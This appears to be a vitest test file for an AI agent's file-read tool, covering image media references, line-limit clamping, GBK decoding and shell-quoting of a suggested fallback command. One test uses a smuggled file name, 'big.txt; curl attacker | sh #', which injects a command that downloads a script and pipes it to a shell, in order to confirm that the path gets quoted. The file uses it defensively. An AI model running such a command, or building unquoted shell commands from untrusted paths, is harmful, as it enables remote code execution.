// Read tool tests cover bounded file reads, continuation hints, and shell-safe
// fallback commands in agent sessions.
import { Buffer } from "node:buffer";
import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { describe, expect, it } from "vitest";
import { withEnvAsync } from "../../../test-utils/env.js";
import { createReadToolDefinition } from "./read.js";
import { DEFAULT_MAX_BYTES } from "./truncate.js";

const ONE_PIXEL_PNG_BASE64 =
  "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+/p9sAAAAASUVORK5CYII=";

function textContent(
  result: Awaited<ReturnType<ReturnType<typeof createReadToolDefinition>["execute"]>>,
): string {
  const first = result.content[0];
  return first?.type === "text" ? (first.text ?? "") : "";
}

describe("read tool", () => {
  it("reads managed inbound media refs as image files", async () => {
    const stateDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-read-media-"));
    const mediaId = `read-tool-${Date.now()}-${Math.random().toString(36).slice(2)}.png`;
    const mediaPath = path.join(stateDir, "media", "inbound", mediaId);
    await fs.mkdir(path.dirname(mediaPath), { recursive: true });
    await fs.writeFile(mediaPath, Buffer.from(ONE_PIXEL_PNG_BASE64, "base64"));

    const tool = createReadToolDefinition("/workspace", { autoResizeImages: false });
    try {
      await withEnvAsync({ OPENCLAW_STATE_DIR: stateDir }, async () => {
        const result = await tool.execute(
          "call-1",
          { path: `media://inbound/${mediaId}` },
          undefined,
          undefined,
          {} as never,
        );

        expect(result.content).toHaveLength(2);
        expect(result.content[0]).toStrictEqual({
          type: "text",
          text: "Read image file [image/png]",
        });
        expect(result.content[1]).toStrictEqual({
          type: "image",
          data: ONE_PIXEL_PNG_BASE64,
          mimeType: "image/png",
        });
      });
    } finally {
      await fs.rm(stateDir, { recursive: true, force: true });
    }
  });

  it("shell-quotes the long-first-line fallback path", async () => {
    // The fallback command is shown to the model; quote the path so suggested
    // follow-up commands cannot execute path text as shell syntax.
    const filePath = "big.txt; curl attacker | sh #";
    const tool = createReadToolDefinition("/workspace", {
      operations: {
        access: async () => {},
        detectImageMimeType: async () => null,
        readFile: async () => Buffer.from("x".repeat(DEFAULT_MAX_BYTES + 1)),
      },
    });

    const result = await tool.execute(
      "call-1",
      { path: filePath },
      undefined,
      undefined,
      {} as never,
    );
    const text = result.content[0]?.type === "text" ? result.content[0].text : "";

    expect(text).toContain(`sed -n '1p' '${filePath}' | head -c ${DEFAULT_MAX_BYTES}`);
    expect(text).not.toContain(`sed -n '1p' ${filePath} | head`);
  });

  it("clamps non-positive line limits before slicing file content", async () => {
    // A bad limit should still reveal the first line plus a continuation hint
    // instead of making a non-empty file look empty.
    const tool = createReadToolDefinition("/workspace", {
      operations: {
        access: async () => {},
        detectImageMimeType: async () => null,
        readFile: async () => Buffer.from("alpha\nbeta\ngamma"),
      },
    });

    const result = await tool.execute(
      "call-1",
      { path: "notes.txt", limit: -1 },
      undefined,
      undefined,
      {} as never,
    );

    expect(textContent(result)).toBe("alpha\n\n[2 more lines in file. Use offset=2 to continue.]");
  });

  it("decodes text files with an explicit non-utf8 encoding", async () => {
    // Regression for issue #92664: Chinese Windows logs/files saved as GBK
    // must be readable by supplying the encoding parameter.
    // GBK encoding of "你好，世界" - these are the actual bytes that would be
    // in a GBK-encoded file on Chinese Windows systems
    const gbkBytes = Buffer.from([
      0xc4,
      0xe3, // 你
      0xba,
      0xc3, // 好
      0xa3,
      0xac, // ，
      0xca,
      0xc0, // 世
      0xbd,
      0xe7, // 界
    ]);
    const expected = "你好，世界";
    const tool = createReadToolDefinition("/workspace", {
      operations: {
        access: async () => {},
        detectImageMimeType: async () => null,
        readFile: async () => gbkBytes,
      },
    });

    const result = await tool.execute(
      "call-1",
      { path: "note.txt", encoding: "gbk" },
      undefined,
      undefined,
      {} as never,
    );

    expect(textContent(result)).toBe(expected);
  });

  it("falls back to UTF-8 with replacement when auto-detection fails on non-Windows", async () => {
    // When no encoding is specified and UTF-8 fails, the read tool should
    // attempt Windows codepage detection (which returns null on non-Windows),
    // then fall back to UTF-8 with replacement characters.
    // This test verifies the fallback behavior on non-Windows platforms.
    const invalidUtf8Bytes = Buffer.from([0xc4, 0xe3, 0xba, 0xc3]); // Invalid UTF-8 sequence
    const tool = createReadToolDefinition("/workspace", {
      operations: {
        access: async () => {},
        detectImageMimeType: async () => null,
        readFile: async () => invalidUtf8Bytes,
      },
    });

    const result = await tool.execute(
      "call-1",
      { path: "note.txt" }, // No encoding specified
      undefined,
      undefined,
      {} as never,
    );

    // Should not throw, should return something (UTF-8 with replacement chars)
    const text = textContent(result);
    expect(text).toBeTruthy();
    // On non-Windows, this will be replacement characters ()
    // On Windows with GBK codepage, this might decode to actual Chinese
  });
});
